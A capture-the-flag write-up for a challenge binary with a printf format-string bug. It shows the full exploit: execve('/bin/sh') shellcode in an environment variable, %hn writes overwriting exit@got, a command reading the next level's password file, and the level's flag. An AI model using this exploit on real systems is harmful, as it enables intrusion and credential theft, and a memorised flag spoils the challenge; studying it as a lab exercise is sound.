@@ -1,0 +1,128 @@
+# Level05
+
+## Reconstructed source
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(void)
+{
+    char buffer[100];
+    int i;
+
+    fgets(buffer, 100, stdin);
+    for (i = 0; buffer[i]; i++)
+    {
+        if (buffer[i] > 0x40 && buffer[i] <= 0x5a)
+            buffer[i] ^= 0x20;
+    }
+    printf(buffer);
+    exit(0);
+}
+```
+
+The loop lowercases every uppercase letter (`A`-`Z`, bytes `0x41`-`0x5a`) by
+XOR-ing with `0x20`. Then the user buffer is printed and the program exits.
+
+## Vulnerability
+
+`printf(buffer)` prints a user-controlled string as the format string: a
+**format string vulnerability**. With `%p`/`%x` we read the stack, and with
+`%n`/`%hn` we write a chosen value to a chosen address.
+
+The program has `NX disabled` (`readelf -l level05` shows `GNU_STACK ... RWE`),
+so shellcode placed in an environment variable is executable. The plan:
+
+1. Put shellcode in an env var and find its address.
+2. Use the format string to overwrite `exit@got` with that address.
+3. When `main` calls `exit(0)`, the `exit@plt` stub jumps through
+   `exit@got` — now pointing at our shellcode, which runs as level06.
+
+The lowercasing loop is a constraint: any byte we place in the buffer that falls
+in `0x41`-`0x5a` gets mangled. All addresses we write into the buffer must avoid
+that range (they do, see below).
+
+## Exploitation
+
+### Step 1 — find the format string offset
+
+Our buffer starts at a fixed stack slot. We find which `%p` argument maps to the
+start of the buffer by prefixing a known marker address and counting:
+
+```sh
+python -c 'print "\xe0\x97\x04\x08" + "%p " * 15' | ./level05
+```
+
+The marker `0x080497e0` shows up at the **10th** `%p`, so `%10$` points to the
+first 4 bytes of our buffer, `%11$` to the next 4 bytes.
+
+### Step 2 — find exit@got and the shellcode address
+
+`exit@got` is the GOT slot the `exit@plt` stub reads. `objdump -d level05`
+around `exit@plt` shows `jmp dword ptr [0x80497e0]`:
+
+```sh
+objdump -d level05 | grep -A2 '<exit@plt>'   # exit@got = 0x080497e0
+```
+
+Put the shellcode in an env var (200-byte NOP sled + 25-byte `execve("/bin/sh")`)
+and read its address with a tiny helper:
+
+```sh
+export PWN=$(python -c 'print "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
+# /tmp/ge.c: int main(int c,char**v){printf("%p\n", getenv(v[1]));}
+/tmp/ge PWN                                   # 0xffffde3d
+```
+
+The sled is large so we can aim at its middle and tolerate the small address
+shift between the helper and the real run. Target address = `0xffffde3d + ~99`
+= **`0xffffdea0`** (lands well inside the sled, then slides into the shellcode).
+
+### Step 3 — build the %n write
+
+We write the 4-byte value `0xffffdea0` into `exit@got` (`0x080497e0`) as two
+2-byte half-writes (`%hn`):
+
+| target | value |
+|--------|-------|
+| `exit@got` = `0x080497e0` | `0xdea0` (low 2 bytes) |
+| `exit@got+2` = `0x080497e2` | `0xffff` (high 2 bytes) |
+
+Layout of the format string:
+
+```
+[0x080497e0][0x080497e2] %56992x %10$hn %8535x %11$hn
+    arg10        arg11
+```
+
+- The two addresses (8 bytes) are args `%10$` and `%11$`.
+- `%56992x` prints 56992 chars -> total printed = 8 + 56992 = 57000 = `0xdea0`
+  -> `%10$hn` writes `0xdea0` into `exit@got`.
+- `%8535x` adds 8535 -> total = 65535 = `0xffff` -> `%11$hn` writes `0xffff`
+  into `exit@got+2`.
+- Result: `exit@got = 0xffffdea0`.
+
+Width maths: `56992 = 0xdea0 - 8`, `8535 = 0xffff - 0xdea0`.
+
+None of the bytes we inject (`e0 97 04 08`, `e2 97 04 08`, and the ASCII
+`%56992x%10$hn%8535x%11$hn`) fall in `0x41`-`0x5a`, so the lowercasing loop
+leaves the payload intact.
+
+### Step 4 — fire
+
+```sh
+(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08%56992x%10$hn%8535x%11$hn"'; cat) | ./level05
+whoami                                # level06
+cat /home/users/level06/.pass
+```
+
+The `; cat` keeps stdin open for the spawned shell. `exit(0)` jumps through the
+overwritten GOT entry into the sled, runs the shellcode, and gives a shell as
+level06.
+
+## Flag
+
+```txt
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
